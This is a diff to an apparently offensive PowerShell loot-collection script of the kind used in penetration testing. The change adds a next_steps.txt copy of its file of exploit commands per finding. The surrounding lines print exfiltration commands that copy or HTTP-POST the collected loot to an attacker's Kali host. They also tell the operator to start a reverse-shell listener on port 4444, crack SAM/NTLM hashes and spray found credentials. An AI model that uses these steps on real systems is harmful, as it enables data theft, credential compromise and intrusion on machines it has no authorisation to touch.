@@ -1163,7 +1163,7 @@ function Invoke-Summary {
 
     $null = $sb.AppendLine("============================================================")
     $null = $sb.AppendLine("  Full data in: $LootDir\")
-    $null = $sb.AppendLine("  ★ attack_commands.txt — resolved exploit commands per finding")
+    $null = $sb.AppendLine("  ★ next_steps.txt — resolved exploit commands per finding")
     $null = $sb.AppendLine("============================================================")
 
     $sb.ToString() | Out-File -Encoding UTF8 $SFile
@@ -1174,11 +1174,12 @@ function Invoke-Summary {
 
 #==============================================================================
 # ATTACK COMMANDS GENERATION
-# Generates attack_commands.txt — resolved exploit commands for each finding.
+# Generates next_steps.txt and attack_commands.txt — resolved exploit commands for each finding.
 # Mirrors the pattern used by lootr.sh on Linux.
 #==============================================================================
 function Invoke-AttackCommands {
     $AFile = Join-Path $LootDir "attack_commands.txt"
+    $NFile = Join-Path $LootDir "next_steps.txt"
     $sb = [System.Text.StringBuilder]::new()
     $HasActions = $false
 
@@ -1410,7 +1411,9 @@ function Invoke-AttackCommands {
 
     $null = $sb.AppendLine("============================================================")
     $sb.ToString() | Out-File -Encoding UTF8 $AFile
+    $sb.ToString() | Out-File -Encoding UTF8 $NFile
     Write-Success "Attack commands written -> $AFile"
+    Write-Success "Next steps alias written -> $NFile"
     Write-Host ""
     Get-Content $AFile | Write-Host
 }
@@ -1454,6 +1457,7 @@ Invoke-AttackCommands
 Write-Host ""
 Write-Success "Loot collection complete. Output: $LootDir\"
 Write-Success "Quick review:      Get-Content $LootDir\summary.txt"
+Write-Success "Next steps:        Get-Content $LootDir\next_steps.txt"
 Write-Success "Attack commands:   Get-Content $LootDir\attack_commands.txt"
 
 Write-Host ""
@@ -1463,12 +1467,12 @@ Write-Host "       # SMB (if servr.sh smb is running on Kali):" -ForegroundColor
 Write-Host "       copy $LootDir\* \\$KaliIp\share\" -ForegroundColor Green
 Write-Host "       # HTTP POST (if Kali has an upload endpoint):" -ForegroundColor Gray
 Write-Host "       Compress-Archive $LootDir $env:TEMP\loot.zip; iwr -Uri http://${KaliIp}/upload -Method POST -InFile $env:TEMP\loot.zip" -ForegroundColor Green
-Write-Host "  2. Start listener for any reverse shell triggers in attack_commands.txt:" -ForegroundColor White
+Write-Host "  2. Start listener for any reverse shell triggers in next_steps.txt:" -ForegroundColor White
 Write-Host "       penelope -p 4444 -O" -ForegroundColor Green
 Write-Host "  3. Crack any SAM / NTLM hashes found on Kali:" -ForegroundColor White
 Write-Host "       ./crackr.sh -f <loot_dir>/creds/sam_hashes.txt" -ForegroundColor Green
 Write-Host "  4. Spray any found credentials on Kali:" -ForegroundColor White
 Write-Host "       ./sprayr.sh --from-creds" -ForegroundColor Green
-Write-Host "  5. Read prioritised attack commands:" -ForegroundColor White
-Write-Host "       type $LootDir\attack_commands.txt" -ForegroundColor Green
+Write-Host "  5. Read prioritised next steps:" -ForegroundColor White
+Write-Host "       type $LootDir\next_steps.txt" -ForegroundColor Green
 Write-Host ""
